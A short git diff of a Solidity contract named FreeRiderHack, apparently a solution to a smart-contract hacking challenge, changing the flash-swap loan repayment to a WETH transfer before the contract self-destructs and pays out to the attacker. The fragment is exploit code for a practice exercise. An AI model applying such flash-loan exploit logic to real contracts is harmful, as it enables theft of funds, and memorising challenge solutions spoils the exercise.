@@ -193,7 +193,7 @@ contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver {
         weth.deposit{value: amountToRepay}();
 
         // 5. repay loan to uniswap
-        IERC20(tokenBorrow).transfer(address(uniswapPair), amountToRepay);
+        weth.transfer(address(uniswapPair), amountToRepay);
 
         // selfdestruct to the owner
         selfdestruct(payable(attacker));
